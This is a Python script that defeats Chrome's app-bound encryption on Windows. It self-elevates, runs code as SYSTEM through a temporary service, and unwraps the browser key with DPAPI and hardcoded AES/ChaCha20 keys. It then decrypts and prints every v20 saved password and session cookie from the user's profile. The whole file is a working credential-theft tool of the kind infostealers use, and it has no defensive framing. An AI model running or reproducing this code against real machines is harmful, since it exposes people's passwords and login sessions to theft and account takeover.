import ctypes
import sys
import time

def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin() != 0
    except:
        return False

if is_admin():
    pass
else:
    print("This script needs to run as administrator. Attempting to relaunch...")
    ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join([sys.argv[0]] + sys.argv[1:]), None, 1)
    exit()

import os
import json
import binascii
from pypsexec.client import Client
from Crypto.Cipher import AES, ChaCha20_Poly1305
import sqlite3
import pathlib
from smbprotocol.exceptions import SMBResponseException

user_profile = os.environ['USERPROFILE']
local_state_path = rf"{user_profile}\AppData\Local\Google\Chrome\User Data\Local State"
cookie_db_path = rf"{user_profile}\AppData\Local\Google\Chrome\User Data\Default\Network\Cookies"
password_db_path = rf"{user_profile}\AppData\Local\Google\Chrome\User Data\Default\Login Data"

with open(local_state_path, "r", encoding="utf-8") as f:
    local_state = json.load(f)

app_bound_encrypted_key = local_state["os_crypt"]["app_bound_encrypted_key"]

arguments = "-c \"" + """import win32crypt
import binascii
encrypted_key = win32crypt.CryptUnprotectData(binascii.a2b_base64('{}'), None, None, None, 0)
print(binascii.b2a_base64(encrypted_key[1]).decode())
""".replace("\n", ";") + "\""

c = Client("localhost")
c.connect()

try:
    c.create_service()

    assert(binascii.a2b_base64(app_bound_encrypted_key)[:4] == b"APPB")
    app_bound_encrypted_key_b64 = binascii.b2a_base64(
        binascii.a2b_base64(app_bound_encrypted_key)[4:]).decode().strip()

    # decrypt with SYSTEM DPAPI
    encrypted_key_b64, stderr, rc = c.run_executable(
        sys.executable,
        arguments=arguments.format(app_bound_encrypted_key_b64),
        use_system_account=True
    )

    # decrypt with user DPAPI
    decrypted_key_b64, stderr, rc = c.run_executable(
        sys.executable,
        arguments=arguments.format(encrypted_key_b64.decode().strip()),
        use_system_account=False
    )

    decrypted_key = binascii.a2b_base64(decrypted_key_b64)[-61:]

finally:
    # Retry service removal to handle potential file lock issues
    for _ in range(3):
        try:
            c.remove_service()
            break
        except SMBResponseException as e:
            if "STATUS_CANNOT_DELETE" in str(e):
                print(f"Failed to remove service: {e}. Retrying...")
                time.sleep(1)  # Wait before retrying
            else:
                raise e
    else:
        print("Warning: Failed to remove service after retries. Manual cleanup may be required.")
    c.disconnect()

# decrypt key with AES256GCM or ChaCha20Poly1305
# key from elevation_service.exe
aes_key = bytes.fromhex("B31C6E241AC846728DA9C1FAC4936651CFFB944D143AB816276BCC6DA0284787")
chacha20_key = bytes.fromhex("E98F37D7F4E1FA433D19304DC2258042090E2D1D7EEA7670D41F738D08729660")

# [flag|iv|ciphertext|tag] decrypted_key
# [1byte|12bytes|variable|16bytes]
flag = decrypted_key[0]
iv = decrypted_key[1:1+12]
ciphertext = decrypted_key[1+12:1+12+32]
tag = decrypted_key[1+12+32:]

if flag == 1:
    cipher = AES.new(aes_key, AES.MODE_GCM, nonce=iv)
elif flag == 2:
    cipher = ChaCha20_Poly1305.new(key=chacha20_key, nonce=iv)
else:
    raise ValueError(f"Unsupported flag: {flag}")

key = cipher.decrypt_and_verify(ciphertext, tag)
print(binascii.b2a_base64(key))

# fetch all v20 cookies
con = sqlite3.connect(pathlib.Path(cookie_db_path).as_uri() + "?mode=ro", uri=True)
cur = con.cursor()
r = cur.execute("SELECT host_key, name, CAST(encrypted_value AS BLOB) from cookies;")
cookies = cur.fetchall()
cookies_v20 = [c for c in cookies if c[2][:3] == b"v20"]
con.close()

# decrypt v20 cookie with AES256GCM
def decrypt_cookie_v20(encrypted_value):
    cookie_iv = encrypted_value[3:3+12]
    encrypted_cookie = encrypted_value[3+12:-16]
    cookie_tag = encrypted_value[-16:]
    cookie_cipher = AES.new(key, AES.MODE_GCM, nonce=cookie_iv)
    decrypted_cookie = cookie_cipher.decrypt_and_verify(encrypted_cookie, cookie_tag)
    return decrypted_cookie[32:].decode('utf-8')

# fetch all v20 passwords
con = sqlite3.connect(pathlib.Path(password_db_path).as_uri() + "?mode=ro", uri=True)
cur = con.cursor()
r = cur.execute("SELECT origin_url, username_value, CAST(password_value AS BLOB) from logins;")
passwords = cur.fetchall()
passwords_v20 = [p for p in passwords if p[2][:3] == b"v20"]
con.close()

# decrypt v20 password with AES256GCM
def decrypt_password_v20(encrypted_value):
    password_iv = encrypted_value[3:3+12]
    encrypted_password = encrypted_value[3+12:-16]
    password_tag = encrypted_value[-16:]
    password_cipher = AES.new(key, AES.MODE_GCM, nonce=password_iv)
    decrypted_password = password_cipher.decrypt_and_verify(encrypted_password, password_tag)
    return decrypted_password.decode('utf-8')

# print decrypted cookies
print("Decrypted Cookies:")
for c in cookies_v20:
    print(c[0], c[1], decrypt_cookie_v20(c[2]))

# print decrypted passwords
print("\nDecrypted Passwords:")
for p in passwords_v20:
    print(p[0], p[1], decrypt_password_v20(p[2]))

# Wait for 10 seconds to allow user to view output before exiting
print("\nScript will exit in 10 seconds...")
time.sleep(10)
